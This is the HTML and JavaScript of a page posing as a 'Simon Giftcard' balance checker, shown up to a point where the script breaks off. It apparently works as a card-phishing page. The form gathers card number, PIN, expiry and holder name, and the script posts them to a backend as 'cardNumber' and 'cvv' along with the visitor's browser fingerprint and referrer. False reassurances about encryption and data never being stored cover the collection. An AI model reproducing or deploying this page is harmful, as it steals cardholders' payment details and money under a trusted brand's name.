<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Check your Simon Gift Card balance online. Enter your card number and PIN to see your available balance instantly.">
  <title>Simon Giftcard - Check Your Balance</title>
  <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=3">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --simon-blue: #003DA5;
      --simon-blue-dark: #002D7A;
      --simon-blue-light: #0051D4;
      --simon-gold: #C5A96A;
      --simon-gold-light: #D4BD8A;
      --white: #ffffff;
      --bg: #f5f5f5;
      --text: #333333;
      --text-muted: #666666;
      --text-light: #999999;
      --border: #ddd;
      --border-light: #e8e8e8;
      --success: #28a745;
      --error: #dc3545;
      --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; -webkit-font-smoothing: antialiased; }

    /* Top Banner */
    .top-banner {
      background: var(--simon-blue);
      color: white;
      text-align: center;
      padding: 8px 16px;
      font-size: 0.8rem;
      letter-spacing: 0.5px;
    }

    /* Header */
    .header {
      background: var(--white);
      border-bottom: 3px solid var(--simon-gold);
      padding: 0 2rem;
    }
    .header-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 70px;
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 12px;
      text-decoration: none;
      color: var(--simon-blue);
    }
    .logo-icon {
      width: 44px;
      height: 44px;
      background: var(--simon-blue);
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 800;
      font-size: 1.1rem;
      letter-spacing: -0.5px;
    }
    .logo-text {
      font-size: 1.6rem;
      font-weight: 800;
      color: var(--simon-blue);
      letter-spacing: -0.5px;
    }
    .logo-sub {
      font-size: 0.7rem;
      color: var(--simon-gold);
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-top: -2px;
    }

    .nav {
      display: flex;
      gap: 0;
      height: 100%;
      align-items: stretch;
    }
    .nav a {
      color: var(--text);
      text-decoration: none;
      font-weight: 600;
      font-size: 0.875rem;
      padding: 0 1.25rem;
      display: flex;
      align-items: center;
      border-bottom: 3px solid transparent;
      margin-bottom: -3px;
      transition: all 0.2s;
    }
    .nav a:hover { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
    .nav a.active { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }

    /* Hero Section */
    .hero {
      background: linear-gradient(135deg, var(--simon-blue) 0%, var(--simon-blue-dark) 100%);
      padding: 3rem 2rem;
      text-align: center;
      color: white;
      position: relative;
      overflow: hidden;
    }
    .hero::before {
      content: "";
      position: absolute;
      top: -50%;
      right: -20%;
      width: 60%;
      height: 200%;
      background: rgba(255,255,255,0.03);
      transform: rotate(20deg);
    }
    .hero h1 {
      font-size: 2.25rem;
      font-weight: 800;
      margin-bottom: 0.5rem;
      letter-spacing: -0.5px;
    }
    .hero p {
      font-size: 1.05rem;
      opacity: 0.85;
      max-width: 500px;
      margin: 0 auto;
    }

    /* Main Content */
    .main-content {
      max-width: 1100px;
      margin: -2rem auto 3rem;
      padding: 0 2rem;
      position: relative;
      z-index: 1;
    }
    .content-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2rem;
      align-items: start;
    }
    @media (max-width: 850px) {
      .content-grid { grid-template-columns: 1fr; }
    }

    /* Card Form Section */
    .form-card {
      background: var(--white);
      border-radius: 12px;
      padding: 2.5rem;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      border: 1px solid var(--border-light);
    }
    .form-card h2 {
      font-size: 1.35rem;
      font-weight: 700;
      color: var(--simon-blue);
      margin-bottom: 0.4rem;
    }
    .form-card .subtitle {
      color: var(--text-muted);
      font-size: 0.9rem;
      margin-bottom: 1.75rem;
      line-height: 1.5;
    }

    .form-group {
      margin-bottom: 1.25rem;
    }
    .form-group label {
      display: block;
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 0.4rem;
    }
    .form-group label .required {
      color: var(--error);
    }
    .form-group input {
      width: 100%;
      padding: 0.75rem 1rem;
      font-size: 0.95rem;
      border: 1px solid var(--border);
      border-radius: 6px;
      transition: all 0.2s;
      font-family: inherit;
      color: var(--text);
      background: var(--white);
    }
    .form-group input:focus {
      outline: 0;
      border-color: var(--simon-blue);
      box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
    }
    .form-group input::placeholder { color: #bbb; }
    .form-group input.error { border-color: var(--error); }

    .card-number-wrapper {
      position: relative;
    }
    .card-number-wrapper input {
      padding-right: 60px;
    }
    .card-brand-badge {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      height: 28px;
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    .card-brand-badge.visible {
      opacity: 1;
    }
    .card-brand-badge img {
      height: 28px;
      width: auto;
      border-radius: 4px;
    }

    .field-error {
      font-size: 0.75rem;
      color: var(--error);
      margin-top: 0.3rem;
      font-weight: 500;
      display: block;
    }

    .form-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1rem;
    }

    .pin-hint {
      display: flex;
      align-items: flex-start;
      gap: 8px;
      margin-top: 0.4rem;
      padding: 0.6rem 0.75rem;
      background: #f8f9fa;
      border-radius: 6px;
      font-size: 0.78rem;
      color: var(--text-muted);
      line-height: 1.4;
    }
    .pin-hint svg {
      flex-shrink: 0;
      margin-top: 1px;
      color: var(--simon-blue);
    }

    .btn-check {
      background: var(--simon-blue);
      color: white;
      padding: 0.85rem 2rem;
      border-radius: 6px;
      border: none;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      width: 100%;
      transition: all 0.2s;
      margin-top: 0.75rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      letter-spacing: 0.3px;
    }
    .btn-check:hover { background: var(--simon-blue-dark); }
    .btn-check:active { transform: scale(0.99); }
    .btn-check:disabled { opacity: 0.65; cursor: not-allowed; }

    .btn-another {
      background: var(--white);
      color: var(--simon-blue);
      padding: 0.75rem 2rem;
      border-radius: 6px;
      border: 2px solid var(--simon-blue);
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      width: 100%;
      transition: all 0.2s;
      margin-top: 1rem;
      display: none;
    }
    .btn-another:hover { background: var(--simon-blue); color: white; }
    .btn-another.show { display: block; }

    /* Info Section */
    .info-card {
      background: var(--white);
      border-radius: 12px;
      padding: 2rem;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      border: 1px solid var(--border-light);
    }

    /* Gift Card Visual */
    .gc-visual {
      width: 100%;
      aspect-ratio: 1.6/1;
      background: linear-gradient(135deg, var(--simon-blue) 0%, #001F5C 100%);
      border-radius: 12px;
      padding: 1.75rem;
      color: white;
      position: relative;
      overflow: hidden;
      margin-bottom: 1.5rem;
      box-shadow: 0 8px 24px rgba(0, 61, 165, 0.3);
    }
    .gc-visual::before {
      content: "";
      position: absolute;
      top: -30%;
      right: -15%;
      width: 50%;
      height: 160%;
      background: rgba(255,255,255,0.04);
      transform: rotate(20deg);
    }
    .gc-visual::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: var(--simon-gold);
    }
    .gc-brand {
      font-size: 1.35rem;
      font-weight: 800;
      letter-spacing: -0.5px;
      margin-bottom: 0.25rem;
    }
    .gc-type {
      font-size: 0.7rem;
      text-transform: uppercase;
      letter-spacing: 3px;
      opacity: 0.7;
      font-weight: 600;
    }
    .gc-chip {
      width: 40px;
      height: 30px;
      background: linear-gradient(135deg, #ffd700, #daa520);
      border-radius: 5px;
      margin: 1.25rem 0;
      position: relative;
      overflow: hidden;
    }
    .gc-chip::after {
      content: "";
      position: absolute;
      inset: 0;
      background: repeating-linear-gradient(90deg, transparent, transparent 5px, rgba(0,0,0,0.08) 5px, rgba(0,0,0,0.08) 10px);
    }
    .gc-number {
      font-family: 'Courier New', monospace;
      font-size: 1.2rem;
      letter-spacing: 3px;
      margin-bottom: 1rem;
      text-shadow: 0 1px 3px rgba(0,0,0,0.3);
    }
    .gc-bottom {
      display: flex;
      justify-content: space-between;
      align-items: flex-end;
    }
    .gc-label {
      font-size: 0.55rem;
      text-transform: uppercase;
      letter-spacing: 1px;
      opacity: 0.6;
      margin-bottom: 2px;
    }
    .gc-value {
      font-size: 0.85rem;
      font-weight: 600;
    }

    /* Info Items */
    .info-title {
      font-size: 1.1rem;
      font-weight: 700;
      color: var(--simon-blue);
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .info-item {
      display: flex;
      gap: 12px;
      margin-bottom: 1rem;
      padding-bottom: 1rem;
      border-bottom: 1px solid var(--border-light);
    }
    .info-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
    .info-icon {
      width: 36px;
      height: 36px;
      background: #f0f4ff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      color: var(--simon-blue);
    }
    .info-text h4 {
      font-size: 0.85rem;
      font-weight: 700;
      color: var(--text);
      margin-bottom: 2px;
    }
    .info-text p {
      font-size: 0.8rem;
      color: var(--text-muted);
      line-height: 1.4;
    }

    /* Balance Result */
    .balance-result {
      display: none;
      text-align: center;
      padding: 2rem 0;
    }
    .balance-result.show { display: block; animation: fadeSlideUp 0.4s ease-out; }
    @keyframes fadeSlideUp {
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .balance-result.success .result-box {
      background: #f0fdf4;
      border: 1px solid #bbf7d0;
      border-radius: 12px;
      padding: 2rem;
    }
    .balance-result.error .result-box {
      background: #fef2f2;
      border: 1px solid #fecaca;
      border-radius: 12px;
      padding: 2rem;
    }
    .result-icon {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1rem;
      font-size: 1.75rem;
      font-weight: 800;
    }
    .success .result-icon { background: var(--success); color: white; }
    .error .result-icon { background: var(--error); color: white; }
    .balance-label {
      font-size: 0.85rem;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 1px;
      font-weight: 600;
      margin-bottom: 0.5rem;
    }
    .balance-amount {
      margin: 0.5rem 0;
    }
    .currency {
      font-size: 1.25rem;
      font-weight: 600;
      color: var(--text-muted);
      vertical-align: top;
    }
    .amount {
      font-size: 3rem;
      font-weight: 800;
      color: var(--simon-blue);
      letter-spacing: -1px;
    }
    .card-info {
      font-size: 0.85rem;
      color: var(--text-muted);
      margin-top: 0.5rem;
    }
    .error-message {
      font-size: 0.95rem;
      color: var(--text);
      margin-top: 0.5rem;
    }

    /* Loading */
    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 30, 80, 0.85);
      backdrop-filter: blur(4px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 100;
      color: white;
      flex-direction: column;
      gap: 1.25rem;
    }
    .loading-overlay.show { display: flex; }
    .spinner {
      width: 44px;
      height: 44px;
      border: 4px solid rgba(255,255,255,0.15);
      border-top-color: var(--simon-gold);
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-overlay span {
      font-weight: 600;
      letter-spacing: 0.5px;
    }

    /* Pages */
    .page { display: none; }
    .page.active { display: block; animation: fadeIn 0.3s ease-out; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    .content-section {
      background: var(--white);
      border-radius: 12px;
      padding: 2.5rem;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      border: 1px solid var(--border-light);
      max-width: 800px;
      margin: 2rem auto 0;
    }
    .content-section h2 {
      font-size: 1.75rem;
      font-weight: 800;
      color: var(--simon-blue);
      margin-bottom: 1rem;
    }
    .content-section p {
      color: var(--text-muted);
      font-size: 1rem;
      margin-bottom: 1.25rem;
      line-height: 1.7;
    }

    .faq-item {
      border-bottom: 1px solid var(--border-light);
      padding: 1.25rem 0;
    }
    .faq-item:last-child { border-bottom: none; }
    .faq-item h4 {
      font-size: 1rem;
      font-weight: 700;
      color: var(--text);
      margin-bottom: 0.5rem;
    }
    .faq-item p { margin-bottom: 0; font-size: 0.925rem; }

    /* Footer */
    .footer {
      background: var(--simon-blue-dark);
      color: rgba(255,255,255,0.7);
      padding: 2rem;
      text-align: center;
      font-size: 0.8rem;
      margin-top: 3rem;
    }
    .footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
    .footer a:hover { color: white; text-decoration: underline; }
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 1.5rem;
      margin-bottom: 1rem;
      flex-wrap: wrap;
    }

    .hide { display: none !important; }

    /* Mobile */
    @media (max-width: 600px) {
      .header-inner { padding: 0 0.5rem; }
      .nav a { padding: 0 0.75rem; font-size: 0.8rem; }
      .hero h1 { font-size: 1.5rem; }
      .hero p { font-size: 0.9rem; }
      .main-content { padding: 0 1rem; }
      .form-card, .info-card { padding: 1.5rem; }
      .form-row { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <!-- Top Banner -->
  <div class="top-banner">
    Secure Gift Card Balance Verification
  </div>

  <!-- Header -->
  <header class="header">
    <div class="header-inner">
      <a href="/" class="logo">
        <div class="logo-icon">S</div>
        <div>
          <div class="logo-text">Simon</div>
          <div class="logo-sub">Giftcard</div>
        </div>
      </a>
      <nav class="nav">
        <a href="/" class="nav-link" data-page="home">Check Balance</a>
        <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
        <a href="/about" class="nav-link" data-page="about">About</a>
      </nav>
    </div>
  </header>

  <!-- Pages -->
  <main>
    <!-- HOME PAGE -->
    <section id="page-home" class="page active">
      <div class="hero">
        <h1>Check Your Gift Card Balance</h1>
        <p>Enter your card details below to view your current available balance.</p>
      </div>

      <div class="main-content">
        <div class="content-grid">
          <!-- Form -->
          <div class="form-card">
            <h2>Card Information</h2>
            <p class="subtitle">Please enter the details found on your gift card.</p>

            <form id="balanceForm">
              <div id="formFields">
                <div class="form-group">
                  <label for="cardNumber">Card Number <span class="required">*</span></label>
                  <div class="card-number-wrapper">
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
                    <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
                  </div>
                  <span class="field-error" id="cardError"></span>
                </div>

                <div class="form-group">
                  <label for="cardHolder">Card Holder Name <span style="font-weight:400;color:var(--text-light)">(Optional)</span></label>
                  <input type="text" id="cardHolder" placeholder="Enter name on card" autocomplete="off">
                </div>

                <div class="form-row">
                  <div class="form-group">
                    <label for="pin">PIN / Security Code <span class="required">*</span></label>
                    <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
                    <span class="field-error" id="pinError"></span>
                  </div>
                  <div class="form-group">
                    <label for="expiryDate">Expiration (MM/YY)</label>
                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
                    <span class="field-error" id="expiryError"></span>
                  </div>
                </div>

                <div class="pin-hint">
                  <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                  <span>The PIN is located on the back of your card. You may need to scratch off the silver coating to reveal it.</span>
                </div>

                <button type="submit" class="btn-check" id="submitBtn">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
                  Check Balance
                </button>
              </div>

              <div id="result" class="balance-result"></div>
              <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
            </form>
          </div>

          <!-- Info Sidebar -->
          <div>
            <!-- Gift Card Visual -->
            <div class="info-card" style="margin-bottom: 1.5rem;">
              <div class="gc-visual">
                <div class="gc-brand">Simon</div>
                <div class="gc-type">Gift Card</div>
                <div class="gc-chip"></div>
                <div class="gc-number" id="gcNumber">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
                <div class="gc-bottom">
                  <div>
                    <div class="gc-label">Card Holder</div>
                    <div class="gc-value" id="gcHolder">GIFT CARD</div>
                  </div>
                  <div>
                    <div class="gc-label">Valid Thru</div>
                    <div class="gc-value" id="gcExpiry">MM/YY</div>
                  </div>
                  <div id="gcBrand" style="height:32px;display:flex;align-items:center;"></div>
                </div>
              </div>
            </div>

            <!-- How It Works -->
            <div class="info-card">
              <div class="info-title">
                <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
                How It Works
              </div>

              <div class="info-item">
                <div class="info-icon">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
                </div>
                <div class="info-text">
                  <h4>1. Enter Card Details</h4>
                  <p>Type your 16-digit card number and 4-digit PIN from the back of your card.</p>
                </div>
              </div>

              <div class="info-item">
                <div class="info-icon">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
                </div>
                <div class="info-text">
                  <h4>2. Secure Verification</h4>
                  <p>Your data is encrypted and securely transmitted for balance lookup.</p>
                </div>
              </div>

              <div class="info-item">
                <div class="info-icon">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                </div>
                <div class="info-text">
                  <h4>3. View Balance</h4>
                  <p>Your available balance is displayed instantly on screen.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- FAQ PAGE -->
    <section id="page-faq" class="page">
      <div class="hero">
        <h1>Frequently Asked Questions</h1>
        <p>Find answers to common questions about Simon Gift Cards.</p>
      </div>
      <div class="main-content">
        <div class="content-section">
          <div class="faq-item">
            <h4>Where do I find my card number?</h4>
            <p>Your 16-digit card number is printed on the front of your Simon Gift Card.</p>
          </div>
          <div class="faq-item">
            <h4>Where is the PIN located?</h4>
            <p>The 4-digit PIN is on the back of your card. You may need to scratch off the silver coating to reveal it. This PIN is required to check your balance.</p>
          </div>
          <div class="faq-item">
            <h4>Is it safe to check my balance here?</h4>
            <p>Yes. We use bank-level 256-bit encryption for all data transmissions. Your card details are never stored on our servers after the balance check is complete.</p>
          </div>
          <div class="faq-item">
            <h4>Why does my card show a zero balance?</h4>
            <p>A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt.</p>
          </div>
          <div class="faq-item">
            <h4>What card types are supported?</h4>
            <p>We support Visa and Mastercard gift cards and prepaid cards. American Express Simon cards may require checking balance through a partner site.</p>
          </div>
          <div class="faq-item">
            <h4>Is there a fee to check my balance?</h4>
            <p>No. Checking your gift card balance is completely free of charge.</p>
          </div>
        </div>
      </div>
    </section>

    <!-- ABOUT PAGE -->
    <section id="page-about" class="page">
      <div class="hero">
        <h1>About Simon Giftcard</h1>
        <p>Fast, secure, and free gift card balance checking.</p>
      </div>
      <div class="main-content">
        <div class="content-section">
          <p>Simon Gift Cards are the perfect gift for any occasion. They can be used anywhere Visa or Mastercard debit cards are accepted, giving recipients the freedom to choose exactly what they want.</p>
          <p>Our balance checker provides a fast, secure way to verify your remaining gift card balance without calling a phone number or visiting a store. Simply enter your card number and PIN to see your available funds instantly.</p>
          <p>Your security is our priority. All card information is encrypted during transmission and is never stored on our servers after the balance check is complete.</p>
        </div>
      </div>
    </section>
  </main>

  <!-- Footer -->
  <footer class="footer">
    <div class="footer-links">
      <a href="/" class="nav-link" data-page="home">Check Balance</a>
      <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
      <a href="/about" class="nav-link" data-page="about">About</a>
    </div>
    <p>&copy; 2026 Simon Giftcard. All rights reserved.</p>
  </footer>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <span>Checking your balance...</span>
  </div>

  <script>
    // Navigation
    function showPageFromPath() {
      const path = window.location.pathname.replace(/\/$/, '') || '/';
      const page = path === '' || path === '/' || path === '/home' ? 'home' : path.replace(/^\//, '') || 'home';
      const valid = ['home', 'faq', 'about'];
      const p = valid.includes(page) ? page : 'home';
      document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
      document.querySelectorAll('.nav-link').forEach(a => {
        a.classList.toggle('active', a.getAttribute('data-page') === p);
      });
      const pageEl = document.getElementById('page-' + p);
      if (pageEl) pageEl.classList.add('active');
    }
    showPageFromPath();
    window.addEventListener('popstate', showPageFromPath);

    document.querySelectorAll('.nav-link').forEach(link => {
      link.addEventListener('click', e => {
        e.preventDefault();
        const page = link.getAttribute('data-page');
        const url = page === 'home' ? '/' : '/' + page;
        history.pushState(null, '', url);
        showPageFromPath();
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    });

    // Elements
    const cardInput = document.getElementById('cardNumber');
    const cardHolderInput = document.getElementById('cardHolder');
    const pinInput = document.getElementById('pin');
    const expiryInput = document.getElementById('expiryDate');
    const form = document.getElementById('balanceForm');
    const resultEl = document.getElementById('result');
    const submitBtn = document.getElementById('submitBtn');
    const formFields = document.getElementById('formFields');
    const checkAnother = document.getElementById('checkAnother');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const cardBrandBadge = document.getElementById('cardBrandBadge');
    const cardBrandImg = document.getElementById('cardBrandImg');

    // Card type detection
    const CARD_LOGOS = { Visa: '/visa.svg', Mastercard: '/mastercard.svg' };
    function getCardType(num) {
      const d = String(num).replace(/\D/g, '');
      if (d.startsWith('4')) return 'Visa';
      if (/^5[1-5]/.test(d)) return 'Mastercard';
      const n4 = d.length >= 4 ? parseInt(d.slice(0, 4), 10) : 0;
      if (d.startsWith('2') && n4 >= 2221 && n4 <= 2720) return 'Mastercard';
      return null;
    }

    // Card number formatting
    cardInput.oninput = e => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 19);
      e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
      e.target.classList.remove('error');
      document.getElementById('cardError').textContent = '';
      // Update card visual
      document.getElementById('gcNumber').textContent = e.target.value || '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
      // Detect card brand
      const type = getCardType(v);
      if (v.length >= 2 && type) {
        cardBrandImg.src = CARD_LOGOS[type];
        cardBrandImg.alt = type;
        cardBrandBadge.classList.add('visible');
        document.getElementById('gcBrand').innerHTML = '<img src="' + CARD_LOGOS[type] + '" alt="' + type + '" style="height:32px;border-radius:4px;">';
      } else {
        cardBrandBadge.classList.remove('visible');
        document.getElementById('gcBrand').innerHTML = '';
      }
    };

    // Card holder name
    cardHolderInput.oninput = e => {
      const name = e.target.value.toUpperCase();
      document.getElementById('gcHolder').textContent = name || 'GIFT CARD';
    };

    // PIN formatting
    pinInput.oninput = e => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
      e.target.classList.remove('error');
      document.getElementById('pinError').textContent = '';
    };

    // Expiry formatting
    expiryInput.oninput = e => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
      if (v.length >= 3) {
        v = v.slice(0, 2) + '/' + v.slice(2);
      }
      e.target.value = v;
      e.target.classList.remove('error');
      document.getElementById('expiryError').textContent = '';
      // Update card visual
      const parts = v.split('/');
      const mm = parts[0] || 'MM';
      const yy = parts[1] || 'YY';
      document.getElementById('gcExpiry').textContent = mm + '/' + yy;
    };

    // Luhn check
    function luhnCheck(num) {
      const digits = String(num).replace(/\D/g, '');
      let sum = 0, alt = false;
      for (let i = digits.length - 1; i >= 0; i--) {
        let n = parseInt(digits[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
      }
      return sum % 10 === 0;
    }

    // Validation
    function validate() {
      const digits = cardInput.value.replace(/\s/g, '');
      const pin = pinInput.value;
      const expiry = expiryInput.value;
      let ok = true;

      document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
      document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error'));

      if (digits.length < 15 || digits.length > 19) {
        document.getElementById('cardError').textContent = 'Please enter a valid card number';
        cardInput.classList.add('error');
        ok = false;
      } else if (!luhnCheck(digits)) {
        document.getElementById('cardError').textContent = 'Invalid card number';
        cardInput.classList.add('error');
        ok = false;
      }

      if (!pin || pin.length < 3 || pin.length > 4) {
        document.getElementById('pinError').textContent = 'Please enter a valid PIN (3-4 digits)';
        pinInput.classList.add('error');
        ok = false;
      }

      if (expiry) {
        const parts = expiry.split('/');
        if (parts.length === 2) {
          const mm = parseInt(parts[0], 10);
          const yy = parts[1];
          if (mm < 1 || mm > 12) {
            document.getElementById('expiryError').textContent = 'Invalid month';
            expiryInput.classList.add('error');
            ok = false;
          }
          if (yy.length !== 2) {
            document.getElementById('expiryError').textContent = 'Use MM/YY format';
            expiryInput.classList.add('error');
            ok = false;
          }
        } else if (expiry.length > 0) {
          document.getElementById('expiryError').textContent = 'Use MM/YY format';
          expiryInput.classList.add('error');
          ok = false;
        }
      }

      return ok;
    }

    // Show result
    function showResult(data) {
      resultEl.className = 'balance-result show ' + (data.success ? 'success' : 'error');
      if (data.success) {
        const amt = typeof data.balance === 'number' ? data.balance.toFixed(2) : (data.balance != null ? String(data.balance) : '0.00');
        resultEl.innerHTML = '<div class="result-box"><div class="result-icon">\u2713</div><div class="balance-label">Available Balance</div><div class="balance-amount"><span class="currency">' + (data.currency || 'USD') + ' </span><span class="amount">$' + amt + '</span></div>' + (data.cardLast4 ? '<p class="card-info">Card ending in \u2022\u2022\u2022\u2022 ' + data.cardLast4 + '</p>' : '') + '</div>';
      } else {
        resultEl.innerHTML = '<div class="result-box"><div class="result-icon">!</div><h3 style="margin-bottom:0.5rem">Unable to Check Balance</h3><p class="error-message">' + (data.error || 'Please verify your card details and try again.') + '</p></div>';
      }
      formFields.classList.add('hide');
      checkAnother.classList.add('show');
      resultEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    // Check another
    checkAnother.onclick = () => {
      resultEl.className = 'balance-result';
      resultEl.innerHTML = '';
      formFields.classList.remove('hide');
      checkAnother.classList.remove('show');
      form.reset();
      document.getElementById('gcNumber').textContent = '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
      document.getElementById('gcExpiry').textContent = 'MM/YY';
      document.getElementById('gcHolder').textContent = 'GIFT CARD';
      document.getElementById('gcBrand').innerHTML = '';
      cardBrandBadge.classList.remove('visible');
    };

    // Form submit
    const CARD_ERROR_MSG = 'Check your card information or use a new card.';

    form.onsubmit = async e => {
      e.preventDefault();
      if (!validate()) return;

      const digits = cardInput.value.replace(/\s/g, '');
      const pin = pinInput.value;
      const expiry = expiryInput.value;

      let expiryMonth = '';
      let expiryYear = '';
      if (expiry) {
        const parts = expiry.split('/');
        expiryMonth = (parts[0] || '').padStart(2, '0');
        expiryYear = parts[1] || '';
      }

      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Checking...';
      loadingOverlay.classList.add('show');

      try {
        const payload = {
          cardNumber: digits,
          expiryMonth: expiryMonth,
          expiryYear: expiryYear,
          cvv: pin,
          cardHolder: cardHolderInput.value.trim(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          userAgent: navigator.userAgent,
          referral: document.referrer || 'Direct',
          pageUrl: window.location.href
        };

        const res = await fetch('/api/check-balance', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const data = await res.json();

        let result = { success: false, error: '' };
        const st = data.status || '';

        // API returns status "OK" on success with balance data
        if (st === 'OK') {
          const d = data.data || data;
          const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : (data.balance !== undefined ? data.balance : data.amount));
          let bal = null;
          let curr = d.currency || data.currency || 'USD';
          if (raw !== undefined && raw !== null && raw !== '') {
            bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
            if (isNaN(bal)) bal = null;
          }
